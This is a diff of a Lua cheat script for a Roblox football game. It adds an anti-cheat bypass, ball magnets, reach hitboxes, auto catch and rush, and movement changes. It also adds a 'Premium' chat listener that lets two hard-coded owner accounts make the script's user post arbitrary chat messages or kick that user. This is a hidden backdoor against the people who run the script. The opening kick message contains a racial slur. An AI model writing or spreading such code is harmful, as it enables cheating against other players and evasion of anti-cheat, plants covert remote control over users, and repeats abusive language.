@@ -8,6 +8,78 @@ if not allowedPlaces[game.PlaceId] then
     game:GetService("Players").LocalPlayer:Kick("Wrong Game Bitch Nigga Check Supported Games")
 end
 
+-- // Celaris Premium (New Feature)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local ownerNames = {
+    ["x8lx8x"] = true,
+    ["xleskyy"] = true
+}
+
+-- Check if player is an owner
+local function isOwner(name)
+    return ownerNames[name] == true
+end
+
+-- Handle commands
+local function handleCommand(message, speaker)
+    if not isOwner(speaker.Name) then return end
+
+    local args = message:split(" ")
+    local cmd = args[1]:lower()
+
+    if cmd == ":talk" then
+        local say = message:sub(#args[1] + 2)
+        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
+            chatRemote.SayMessageRequest:FireServer(say, "All")
+        end
+
+    elseif cmd == ":kick" then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "You’ve been kicked",
+            Text = "The owner removed your access.",
+            Duration = 5
+        })
+        task.wait(2)
+        LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
+    end
+end
+
+-- Listen to chat from all players
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        handleCommand(msg, plr)
+    end)
+end
+
+-- Listen for owners who join later
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        handleCommand(msg, plr)
+    end)
+end)
+
+
+-- Connect to owners
+for _, plr in pairs(Players:GetPlayers()) do
+    if isOwner(plr.Name) then
+        plr.Chatted:Connect(function(msg)
+            handleCommand(msg, plr)
+        end)
+    end
+end
+
+-- Connect if an owner joins later
+Players.PlayerAdded:Connect(function(plr)
+    if isOwner(plr.Name) then
+        plr.Chatted:Connect(function(msg)
+            handleCommand(msg, plr)
+        end)
+    end
+end)
+
 -- Executor Check
 local function BadExecutors()
     return string.match(getexecutorname(), "Solara")
@@ -32,7 +104,7 @@ end
 -- Anti-Cheat Bypass
 LPH_NO_VIRTUALIZE(function()
     if hookmetamethod and not BadExecutors() then
-        if game.PlaceId ~= 8206123457 and game.PlaceId == 8204899140 then
+        if game.PlaceId == 8204899140 or game.PlaceId == 17541256525 then
             local Players = game:GetService("Players")
             local ReplicatedStorage = game:GetService("ReplicatedStorage")
             local ReplicatedFirst = game:GetService("ReplicatedFirst")
@@ -112,31 +184,48 @@ else
     print("Celaris failed to bypass!")
 end
 
-
-
 local Player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
 
+-- // Library Toggle KeyBind
 local keysus = "RightControl"
+-- // Magnets
 local Magnets = false
 local ShowHitbox = false
 local Range = 10
+-- // Auto Catch
 local autoCatchEnabled = false
 local catchDelay = 0.01
 local maxAutoCatchDistance = 10 -- default value
+-- // Auto Swat
 local autoSwatEnabled = false
 local swatDelay = 0.01
 local maxAutoSwatDistance = 10
+-- // Auto Quarterback
 local autoQBEnabled = false
+-- // Reset After Catch
 local resetAfterCatchEnabled = false
 local resetAfterCatchDelay = 1
+-- // Auto Rush
 local autoRushEnabled = false
 local autoRushDelay = 0.5
+-- // Better FPS or Lower Graphics
 local lowerGraphicsEnabled = false
 
+-- // Angle Enhancer
+local angleEnhancerEnabled = false
+local angleBoostAmount = 5
+local angleHoldTime = 1.5
+local angleJumpBoosted = false
+local sHeldTime = 0
+local previousJumpPower = 50 -- This will get overwritten once you activate
+
+-- // Players (Main Variables)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+-- // Block Reach
 local toggleBlockReach = false
 local blockReachAmount = 3 -- default slider value
 local originalSize = Vector3.new(0.8500000238418579, 5, 1.5)
@@ -146,11 +235,9 @@ local function applyBlockReach()
 	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 	local blockPart = char:FindFirstChild(blockPartName)
 	if blockPart and blockPart:IsA("BasePart") then
-		blockPart.Size = Vector3.new(2.5, originalSize.Y, originalSize.Z + blockReachAmount)
+		blockPart.Size = Vector3.new(4.5, originalSize.Y, originalSize.Z + blockReachAmount)
 	end
 end
-
--- Function to reset block reach
 local function resetBlockReach()
 	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 	local blockPart = char:FindFirstChild(blockPartName)
@@ -158,68 +245,69 @@ local function resetBlockReach()
 		blockPart.Size = originalSize
 	end
 end
-
--- Character reset handling (reset-proof feature)
 LocalPlayer.CharacterAdded:Connect(function()
 	if toggleBlockReach then
 		task.wait(1) -- wait for the character to fully load
 		applyBlockReach()
 	end
 end)
-
-
-
+-- // Tackle Reach
 local tackleReachEnabled = false
-
+-- // Auto Jump
 local autoJumpEnabled = false
 local jumpDelay = 0.01
 local jumpMaxDistance = 10
-
+-- // Original Materials for Lower Graphics
 local originalMaterials = {}
+-- // Stadium Original CFrame (Hide Stadium Logic)
 local stadiumOriginalCFrame = nil
+-- // Old Ball Trail Variable (not used)
 local ballTrailEnabled = false
-
+-- // CFrame Pull
 local pullEnabled = false
 local pullDistance = 10
 local pullDelayEnabled = false
 local pullDelayAmount = 0.1
 local lastPossessTime = 0
-
+-- // No JumpCooldown
 local noJumpCooldownEnabled = false
 local lastFakeJumpTime = 0
-local jumpCooldownWait = 0.3
+local jumpCooldownWait = 0.5
 local jumpConnection
-
+-- // Magnet Delay
 local UseMagnetDelay = false
 local MagnetDelay = 0.01 -- Default value
+-- // Magnet Hitbox Customization
 local HitboxColor = Color3.fromRGB(178, 178, 178) -- Default color
 local HitboxTransparency = 0.8 -- Default transparency
+-- // More Extra Player Logic
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local Character = Player.Character or Player.CharacterAdded:Wait()
-
 Player.CharacterAdded:Connect(function(char)
     Character = char
 end)
-
--- Walkspeed and No Move Restrictions Variable
+-- Walkspeed and No Move Restrictions
 local walkSpeedEnabled = false
 local walkSpeedValue = 20  -- Default WalkSpeed
 local jumpPowerEnabled = false
 local jumpPowerValue = 50  -- Default JumpPower
 local noMoveRestrictions = false
 
-
--- // Feature Toggles and Sliders
-local walkSpeedEnabled = false
-local walkSpeedValue = 20
-
--- Variables
+-- // Scramble Wall (Recoded so it'll work in Practice)
 local workspace = game:GetService("Workspace")
-local scrambleWall = workspace:WaitForChild("ScrambleWall") -- Assumes ScrambleWall exists in workspace
+local allowedPlaceIds = {
+    [8204899140] = true,
+    [17541256525] = true
+}
+
+local scrambleWall
+
+if allowedPlaceIds[game.PlaceId] then
+    scrambleWall = workspace:WaitForChild("ScrambleWall")
+end
 local toggle = false
 local canCollideCheck = true -- Whether CanCollide should be checked
-
 -- Function to disable CanCollide
 local function disableCanCollide()
     if scrambleWall and scrambleWall:IsA("BasePart") then
@@ -228,17 +316,12 @@ local function disableCanCollide()
         end
     end
 end
-
+-- // Remove Rain & Snow & Rain Sound Logic
 local rainWasInitiallyEnabled = false
 local snowWasInitiallyEnabled = false
 local rainSoundWasPlaying = false
 
-local jumpPowerEnabled = false
-local jumpPowerValue = 50
-
-local noMoveRestrictions = false
-local autoCaptainActive = false
-
+-- // CFrame full Function
 local function pullToFootball()
     task.spawn(function()
         while pullEnabled do
@@ -287,7 +370,7 @@ local function pullToFootball()
     end)
 end
 
--- // Apply Settings Function
+-- // WalkSpeed, JumpPower and No Move Restrictions Logic
 local function applySettings()
     local character = game:GetService("Players").LocalPlayer.Character
     if character and character:FindFirstChild("Humanoid") then
@@ -296,17 +379,15 @@ local function applySettings()
         -- WalkSpeed logic
         if walkSpeedEnabled then
             if humanoid.WalkSpeed == 0 and not noMoveRestrictions then
-                -- Don't apply WalkSpeed while restricted
                 return
             end
             humanoid.WalkSpeed = walkSpeedValue
         elseif noMoveRestrictions and humanoid.WalkSpeed == 0 then
-            humanoid.WalkSpeed = 20 -- Default speed fix when restricted but bypass is on
+            humanoid.WalkSpeed = 20
         else
             humanoid.WalkSpeed = 20
         end
 
-        -- JumpPower logic
         if jumpPowerEnabled then
             humanoid.JumpPower = jumpPowerValue
         else
@@ -315,10 +396,15 @@ local function applySettings()
     end
 end
 
+-- // More Important Variables
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
+-- // Jump CooldownActive Call
+local jumpCooldownActive = false
+
+-- // Jump Cooldown Setup
 local function setupNoJumpCooldown()
     if typeof(jumpConnection) == "RBXScriptConnection" then
         jumpConnection:Disconnect()
@@ -329,32 +415,36 @@ local function setupNoJumpCooldown()
         jumpConnection = UserInputService.JumpRequest:Connect(function()
             local character = LocalPlayer.Character
             local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
-
             if not humanoid then return end
 
-            task.wait()
+            task.wait() -- Give the game a frame to register legit jumps
 
-            if humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
-                local currentTime = tick()
-                if currentTime - lastFakeJumpTime >= jumpCooldownWait then
-                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                    lastFakeJumpTime = currentTime
-                end
+            if not jumpCooldownActive and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
+                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                jumpCooldownActive = true
+                lastFakeJumpTime = tick()
+
+                task.delay(jumpCooldownWait, function()
+                    jumpCooldownActive = false
+                end)
             end
         end)
     end
 end
 
-
+-- // Auto Rush
 -- Function to find the player holding the football
 local function findFootballHolder()
     for _, player in pairs(Players:GetPlayers()) do
-        if player.Character and player.Character:FindFirstChild("Football") then
-            return player
+        if player.Team ~= LocalPlayer.Team then -- 🛑 Make sure player is NOT on your team
+            if player.Character and player.Character:FindFirstChild("Football") then
+                return player
+            end
         end
     end
     return nil
 end
+
 
 local function predictPosition(targetHrp, timeAhead)
     local targetVelocity = targetHrp.Velocity
@@ -406,7 +496,7 @@ CatchingTab:CreateToggle("Show Hitbox", function(value)
     ShowHitbox = value
 end)
 
-CatchingTab:CreateSlider(7, 20, "Magnets Size", function(value)
+CatchingTab:CreateSlider(5, 20, "Magnets Size", function(value)
     Range = value
     for _, v in workspace:GetChildren() do
         if v.Name == "Football" and v:IsA("BasePart") then
@@ -594,7 +684,7 @@ AutomaticsTab:CreateTextBox("Catch Delay", "Delay Number", function(v)
     end
 end)
 
-AutomaticsTab:CreateSlider(10, 30, "Max Distance", function(value)
+AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
     maxAutoCatchDistance = value
 end)
 
@@ -628,7 +718,7 @@ AutomaticsTab:CreateTextBox("Swat Delay", "Delay Number", function(v)
     end
 end)
 
-AutomaticsTab:CreateSlider(10, 30, "Max Distance", function(value)
+AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
     maxAutoSwatDistance = value
 end)
 
@@ -661,10 +751,9 @@ AutomaticsTab:CreateTextBox("Jump Delay", "Delay Number", function(v)
     end
 end)
 
-AutomaticsTab:CreateSlider(10, 30, "Max Distance", function(value)
+AutomaticsTab:CreateSlider(10, 50, "Max Distance", function(value)
     jumpMaxDistance = value
 end)
-
 
 AutomaticsTab:CreateLabel("Reset After Catch")
 
@@ -745,7 +834,7 @@ PlayersTab:CreateToggle("WalkSpeed", function(value)
     walkSpeedEnabled = value
 end)
 
-PlayersTab:CreateSlider(20, 23, "JumpPower Amount", function(value)
+PlayersTab:CreateSlider(20, 23, "WalkSpeed Amount", function(value)
     walkSpeedValue = value
 end)
 
@@ -756,6 +845,73 @@ end)
 PlayersTab:CreateSlider(50, 60, "JumpPower Amount", function(value)
     jumpPowerValue = value
 end)
+
+-- // Angle Enhancer Logic
+local function updateAngleEnhancer()
+    if not angleEnhancerEnabled then return end
+
+    local char = Player.Character
+    if not char then return end
+
+    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+    if not humanoid then return end
+
+    local currentTime = tick()
+
+    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
+        if sHeldTime == 0 then
+            sHeldTime = currentTime
+        elseif currentTime - sHeldTime >= angleHoldTime and not angleJumpBoosted then
+            previousJumpPower = humanoid.JumpPower
+            humanoid.JumpPower = previousJumpPower + angleBoostAmount
+            angleJumpBoosted = true
+        end
+    else
+        if angleJumpBoosted then
+            humanoid.JumpPower = previousJumpPower
+        end
+        angleJumpBoosted = false
+        sHeldTime = 0
+    end
+end
+
+PlayersTab:CreateLabel("Angle Enhancer")
+PlayersTab:CreateToggle("Enabled", function(value)
+    angleEnhancerEnabled = value
+
+    if not value and angleJumpBoosted then
+        local char = Player.Character
+        if char then
+            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+            if humanoid then
+                humanoid.JumpPower = previousJumpPower
+            end
+        end
+        angleJumpBoosted = false
+        sHeldTime = 0
+    end
+
+    if value then
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Angle Enhancer",
+                Text = "If JumpPower is enabled you should probably turn it off so you're not blatant.",
+                Duration = 4
+            })
+        end)
+    end
+end)
+
+PlayersTab:CreateSlider(1, 10, "Angle Boost", function(value)
+    angleBoostAmount = value
+end)
+
+PlayersTab:CreateSlider(1, 3, "Hold-Time", function(value)
+    angleHoldTime = value
+end)
+
+-- // Run Service Heartbeat for the Angle Enhancer
+
 
 PlayersTab:CreateLabel("Defense")
 
@@ -772,7 +928,6 @@ PlayersTab:CreateToggle("Block Reach", function(value)
 	end
 end)
 
--- Slider
 PlayersTab:CreateSlider(3, 10, "Reach Amount", function(value)
 	blockReachAmount = value
 	if toggleBlockReach then
@@ -856,22 +1011,34 @@ VisualsTab:CreateToggle("Remove Rain", function(value)
     end
 end)
 
+local snowStates = {} -- Table to track original states
+
 VisualsTab:CreateToggle("Remove Snow", function(value)
     local weather = workspace:FindFirstChild("SkyWeather")
-    if weather and weather:IsA("BasePart") then
-        local snow = weather:FindFirstChild("Snow")
-        if snow and snow:IsA("ParticleEmitter") then
-            if value then
-                -- Toggle ON: remove snow if it was enabled
-                snowWasInitiallyEnabled = snow.Enabled
-                if snow.Enabled then
-                    snow.Enabled = false
-                end
-            else
-                -- Toggle OFF: only re-enable if it was originally on
-                if snowWasInitiallyEnabled then
-                    snow.Enabled = true
-                end
+    if not weather or not weather:IsA("BasePart") then return end
+
+    -- Get all descendants named "Snow" that are ParticleEmitters
+    local snowEmitters = {}
+    for _, descendant in ipairs(weather:GetDescendants()) do
+        if descendant:IsA("ParticleEmitter") and descendant.Name == "Snow" then
+            table.insert(snowEmitters, descendant)
+        end
+    end
+
+    if value then
+        -- Toggle ON: Store state & disable active ones
+        snowStates = {}
+        for _, snow in ipairs(snowEmitters) do
+            snowStates[snow] = snow.Enabled
+            if snow.Enabled then
+                snow.Enabled = false
+            end
+        end
+    else
+        -- Toggle OFF: Re-enable only those that were originally enabled
+        for snow, wasEnabled in pairs(snowStates) do
+            if snow and snow:IsDescendantOf(workspace) and wasEnabled then
+                snow.Enabled = true
             end
         end
     end
@@ -880,7 +1047,6 @@ end)
 VisualsTab:CreateLabel("Miscellaneous")
 VisualsTab:CreateToggle("Remove QB Boundaries", function(value)
     toggle = value
-    print("ScrambleWall CanCollide check: " .. (toggle and "ON" or "OFF"))
 end)
 -- Source
 
@@ -1047,13 +1213,15 @@ task.spawn(function()
         local closest, closestDist = nil, math.huge
 
         for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
-            if plr ~= player and plr.Character and plr.Character:FindFirstChild("Football") then
-                local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    local dist = (hrp.Position - targetHRP.Position).Magnitude
-                    if dist < closestDist then
-                        closestDist = dist
-                        closest = targetHRP
+            if plr ~= player and plr.Team ~= player.Team then  -- ✅ skip teammates
+                if plr.Character and plr.Character:FindFirstChild("Football") then
+                    local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
+                    if targetHRP then
+                        local dist = (hrp.Position - targetHRP.Position).Magnitude
+                        if dist < closestDist then
+                            closestDist = dist
+                            closest = targetHRP
+                        end
                     end
                 end
             end
@@ -1275,4 +1443,8 @@ SettingsTab:CreateTextBox("UI Keybind", "Key Here", function(v)
             })
         end)
     end
+end)
+
+RunService.Heartbeat:Connect(function()
+    updateAngleEnhancer()
 end)
